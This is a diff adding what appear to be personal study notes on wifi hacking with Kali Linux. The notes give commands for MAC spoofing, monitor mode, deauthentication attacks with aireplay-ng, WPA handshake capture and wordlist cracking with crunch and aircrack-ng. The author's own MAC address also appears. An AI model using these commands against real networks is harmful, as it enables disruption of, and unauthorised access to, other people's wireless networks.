@@ -1,0 +1,135 @@
+lsb_release -a // to see the version of kali
+
+uname -a // to see operating system
+
+# install font unicode; copy the font to the folder below
+/usr/share/fonts
+# then issu the below command
+fc-cache -fv
+
+
+******************************************************
+*** Network Hakcing
+******************************************************
+
+*** Fix Kali driver
+
+sudo apt-get install firmware-iwlwifi 
+sudo modprobe -r iwlwifi
+sudo modprobe iwlwifi
+
+******************
+ifconfig
+    list all network interface devices
+
+ifconfig wlan0 down
+    to disable the interface
+
+ifconfig wlan0 hw ether 00:11:22:33:44:55
+    to change the Mac Address
+    make sure the Mac Address starts with 00
+**** my original mac address: ce:68:1e:1d:f8:34
+
+ifconfig wlan0 up
+    to enable the interface
+
+***Prevent from revert back to original Mac Address***
+leafpad /etc/NetworkManager/NetworkManager.conf
+    Paste the following in the config file:
+
+    [device]
+    wifi.scan-rand-mac-address=no
+
+    [connection]
+    ethernet.cloned-mac-address=preserve
+    wifi.cloned-mac-address=preserve
+
+service network-manager restart
+    to restart the network manager after changing the config file
+
+
+iwconfig
+    to see the mode of wifi adapter
+
+ifconfig wlan0 down
+
+airmon-ng check kill
+    to kill all process that interfere when using with wifi
+    attack needs monitor mode no need the internet connection
+
+iwconfig wlan0 mode monitor 
+    to change to monitor mode
+
+*** To capture all packets in our range
+
+airodump-ng wlan0 
+    to capture all packets
+
+
+ESSID (name of the wifi)
+BSSID (mac addre of target network)
+PWR (strenght of signal; higher better)
+Beacons (frames to broadcast its existence)
+CH (chanenl)
+ENC (encription)
+#Data (useful packets)
+#/S (numbers of data collected)
+MB (maximum speed supported by network)
+CIPHER (cipher use in the network)
+Auth (auth used again in the nework)
+
+
+*** Change Mac address with macchanger
+
+macchanger --random wlan0
+    change mac address randomly
+
+
+***enable monitor mode
+
+airmon-ng start wlan0
+
+airmon-ng stop wlan0/mon0 
+    to stop mointor mode
+
+airmon-ng check kill 
+airmon-ng start wlan0
+
+******
+
+Sniffing using airodump-ng 
+
+airodump-ng --channel 2 --bssid mac-address --write file_name wlan0
+
+*** To deauthenciate device from the network
+
+aireplay-ng --deauth 10000 -a mac_of_target_ap -c mac_of_target  wlan0
+
+*** Determine the name of the wifi 
+
+airodump-ng --bssid macOfACPoint --channel 6 wlan0 
+
+then deauth attack with 4 packets
+
+
+****Cracking WPA by capture the handshake packets
+after capture the handshake, create a wordlist
+
+crunch 8 8 abcdefgh -o sample-wordlist 
+
+then crack using aircrack-ng
+
+sudo aircrack-ng test_sniff-08.cap -w sample-wordlist   
+
+*** Information Gathering 
+
+sudo netdiscover -r 192.168.1.1/24
+    to see mac of devices connected to the apt
+
+*** Use nmap/zenmap many more Information
+
+
+*** Man in the middle attach => interecept the network in the middle
+
+
+
